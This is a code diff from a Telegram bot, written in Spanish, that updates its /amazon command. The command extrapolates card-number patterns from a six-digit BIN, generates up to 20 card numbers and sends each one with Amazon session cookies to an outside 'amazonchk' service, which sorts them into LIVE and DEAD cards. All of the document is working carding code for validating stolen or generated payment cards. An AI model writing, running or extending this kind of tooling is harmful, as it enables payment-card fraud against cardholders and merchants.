@@ -668,10 +668,9 @@ async function verificarTarjetasAmazonConCookie(tarjetas, cookie, chatId, telegr
     return resultados;
 }
 
-// ========== COMANDO /AMAZON (paso 7) ==========
-const amazonRegex = /^\/(?:amazon|amz)(?:\s+(.+))?/i;
-bot.onText(amazonRegex, async (msg, match) => {
- const chatId = msg.chat.id;
+
+bot.onText(/\/amazon(?:\s+(.+))?/i, async (msg, match) => {
+    const chatId = msg.chat.id;
     const telegramId = msg.from.id;
     const user = await getUserByTelegramId(telegramId);
     if (!user) return sendSafeMessage(chatId, '❌ Usa /start primero.');
@@ -713,25 +712,25 @@ bot.onText(amazonRegex, async (msg, match) => {
         }
     }
 
-    let tarjetas = [];
     let param = match[1];
-    
     if (!param) {
-        // Modo interactivo: pedir tarjetas
         setUserState(telegramId, { step: 'awaiting_amazon_cards' });
         return sendSafeMessage(chatId, '💳 Envía las tarjetas (formato texto sucio, patrón extra o BIN de 6 dígitos):');
     }
 
-    // Detectar tipo de entrada
     const esBin = /^\d{6}$/.test(param);
     const esExtra = param.includes('|') && /[0-9X]+\|\d{2}\|\d{2,4}/.test(param);
     
     try {
+        let tarjetas = [];
+        let patronElegido = null;
+        let mensajeResumen = '';
+
         if (esBin) {
-            // 1. Obtener tarjetas mediante extrapolador
+            // 1. Obtener datos del extrapolador
             await sendSafeMessage(chatId, `🔮 Extrapolando desde BIN ${param}...`);
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 180000);
+            const timeoutId = setTimeout(() => controller.abort(), 60000);
             const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -749,34 +748,143 @@ bot.onText(amazonRegex, async (msg, match) => {
             if (!response.ok || !data.success || !data.data || data.data.length === 0) {
                 throw new Error(`No se encontraron tarjetas para el BIN ${param}`);
             }
-            tarjetas = data.data; // array de strings "16digitos|MM|YYYY|CVV"
+
+            // Procesar patrones igual que en /extrapolador
+            const patrones = {};
+            for (const tarjeta of data.data) {
+                const partes = tarjeta.split('|');
+                if (partes.length < 3) continue;
+                const numero = partes[0];
+                const mes = partes[1];
+                const año = partes[2];
+                if (numero.length !== 16) continue;
+                const prefix = numero.slice(0, 12);
+                const clave = `${prefix}xxxx|${mes}|${año}`;
+                patrones[clave] = (patrones[clave] || 0) + 1;
+            }
+            if (Object.keys(patrones).length === 0) throw new Error('No se pudieron extraer patrones.');
+
+            // Clasificar
+            const muy = [], mod = [], uni = [];
+            for (const [patron, count] of Object.entries(patrones)) {
+                if (count >= 3) muy.push({ patron, count });
+                else if (count === 2) mod.push({ patron, count });
+                else uni.push({ patron, count });
+            }
+            muy.sort((a, b) => b.count - a.count);
+            mod.sort((a, b) => b.count - a.count);
+            uni.sort((a, b) => b.count - a.count);
+
+            // Seleccionar el mejor patrón (primero de muy, si no de mod, si no de uni)
+            let mejor = null;
+            if (muy.length) mejor = muy[0];
+            else if (mod.length) mejor = mod[0];
+            else if (uni.length) mejor = uni[0];
+            if (!mejor) throw new Error('No se encontró ningún patrón válido.');
+            patronElegido = mejor.patron;
+            const [prefix, mes, año] = patronElegido.split('|');
+            const extraElegido = `${prefix}xxxx|${mes}|${año}|rnd`; // para generar tarjetas
+
+            // Construir mensaje resumen (similar al de extrapolador pero con indicación del elegido)
+            mensajeResumen = `=== EXTRAPOLACIÓN COMPLETADA ===\n`;
+            mensajeResumen += `✅ EXTRA A CHECAR: \`${prefix}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
+            if (muy.length) {
+                mensajeResumen += `🟢 PATRONES MUY REPETIDOS (${muy.length}):\n==================================================\n`;
+                for (const p of muy.slice(0, 10)) {
+                    const [pf, m, a] = p.patron.split('|');
+                    mensajeResumen += `${pf}xxxx | ${m}/${a} | (${p.count} veces)\n`;
+                }
+                if (muy.length > 10) mensajeResumen += `... y ${muy.length - 10} más.\n`;
+                mensajeResumen += `\n`;
+            }
+            if (mod.length) {
+                mensajeResumen += `🟡 PATRONES MODERADOS (${mod.length}):\n==================================================\n`;
+                for (const p of mod.slice(0, 5)) {
+                    const [pf, m, a] = p.patron.split('|');
+                    mensajeResumen += `${pf}xxxx | ${m}/${a} | (${p.count} veces)\n`;
+                }
+                if (mod.length > 5) mensajeResumen += `... y ${mod.length - 5} más.\n`;
+                mensajeResumen += `\n`;
+            }
+            if (uni.length) {
+                mensajeResumen += `🔴 PATRONES ÚNICOS (${uni.length}):\n==================================================\n`;
+                for (const p of uni.slice(0, 10)) {
+                    const [pf, m, a] = p.patron.split('|');
+                    mensajeResumen += `${pf}xxxx | ${m}/${a} | (${p.count} vez)\n`;
+                }
+                if (uni.length > 10) mensajeResumen += `... y ${uni.length - 10} más.\n`;
+            }
+            await sendSafeMessage(chatId, mensajeResumen, { parse_mode: 'Markdown' });
+
+            // Generar tarjetas a partir del patrón elegido (máximo 20)
+            tarjetas = generarTarjetasDesdePatron(extraElegido, 20);
             if (tarjetas.length === 0) throw new Error('No se generaron tarjetas.');
+            
+            // Mostrar las tarjetas generadas (primeras 20)
+            let listaTarjetas = `🎴 *Tarjetas generadas (${tarjetas.length}) para el extra elegido:*\n`;
+            for (let i = 0; i < Math.min(tarjetas.length, 20); i++) {
+                listaTarjetas += `\`${tarjetas[i]}\`\n`;
+            }
+            await sendSafeMessage(chatId, listaTarjetas, { parse_mode: 'Markdown' });
+
         } 
         else if (esExtra) {
-            // 2. Generar tarjetas desde patrón
-            const cantidad = 10; // o podrías permitir especificar cantidad
-            tarjetas = generarTarjetasDesdePatron(param, cantidad);
+            // Si ya es un extra, generar directamente
+            tarjetas = generarTarjetasDesdePatron(param, 20);
+            if (tarjetas.length === 0) throw new Error('No se generaron tarjetas.');
+            let listaTarjetas = `🎴 *Tarjetas generadas (${tarjetas.length}) para el extra:*\n`;
+            for (let i = 0; i < Math.min(tarjetas.length, 20); i++) {
+                listaTarjetas += `\`${tarjetas[i]}\`\n`;
+            }
+            await sendSafeMessage(chatId, listaTarjetas, { parse_mode: 'Markdown' });
         } 
         else {
-            // 3. Limpiar texto sucio
+            // Limpiar texto sucio
             tarjetas = limpiarTarjetas(param);
+            if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas válidas.');
+            if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
+            await sendSafeMessage(chatId, `💳 *Tarjetas a verificar:*\n${tarjetas.map(t => `\`${t}\``).join('\n')}`, { parse_mode: 'Markdown' });
         }
 
-        if (tarjetas.length === 0) throw new Error('No se encontraron tarjetas válidas.');
-        if (tarjetas.length > 20) return sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
-
-        await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas con Amazon...`);
-        const resultados = await verificarTarjetasAmazon(tarjetas, cookie);
+        // Verificar con Amazon (mostrando progreso en vivo)
+        const total = tarjetas.length;
+        let progressMsg = await sendSafeMessage(chatId, `🔍 Iniciando verificación de ${total} tarjetas... 0/${total}`);
+        const resultados = [];
+        for (let i = 0; i < total; i++) {
+            const card = tarjetas[i];
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000);
+                const resp = await fetch(`https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ card, cookies: cookie }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                const data = await resp.json();
+                resultados.push({ card, status: data.status, message: data.message });
+            } catch (err) {
+                resultados.push({ card, status: 'ERROR', message: err.message });
+            }
+            // Actualizar mensaje de progreso cada vez
+            const emoji = resultados[i].status === 'LIVE' ? '✅' : (resultados[i].status === 'DEAD' ? '❌' : '⚠️');
+            const newText = `🔍 Verificando... ${i+1}/${total}\nÚltima: ${card} → ${resultados[i].status} ${emoji}`;
+            try {
+                await bot.editMessageText(newText, { chat_id: chatId, message_id: progressMsg.message_id });
+            } catch (e) { /* ignorar si no se puede editar */ }
+            await new Promise(resolve => setTimeout(resolve, 800)); // pausa para no saturar
+        }
         
-        // Mostrar resultados con separador aleatorio
+        // Mostrar resumen final con separador aleatorio
         const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
-        let resumen = `${separador}\n`;
+        let resumen = `📊 *Resultados finales*\n${separador}\n`;
         for (const r of resultados) {
             const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
-            resumen += `• Card: ${r.card}\n• Status: ${r.status} ${emoji}\n${separador}\n`;
+            resumen += `• Card: \`${r.card}\`\n• Status: ${r.status} ${emoji}\n${separador}\n`;
         }
         if (resumen.length > 4096) resumen = resumen.substring(0, 4000) + '...';
-        await sendSafeMessage(chatId, resumen);
+        await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
         
     } catch (error) {
         console.error('Error en /amazon:', error);
@@ -784,7 +892,6 @@ bot.onText(amazonRegex, async (msg, match) => {
     }
     clearUserState(telegramId);
 });
-
 // ========== COMANDO /AMAZONCOOKIE (igual pero genera cookie primero) ==========
 const amazonCookieRegex = /^\/(?:amazoncookie|amazoncuki|amazonck|amzck)(?:\s+(.+))?/i;
 bot.onText(amazonCookieRegex, async (msg, match) => {
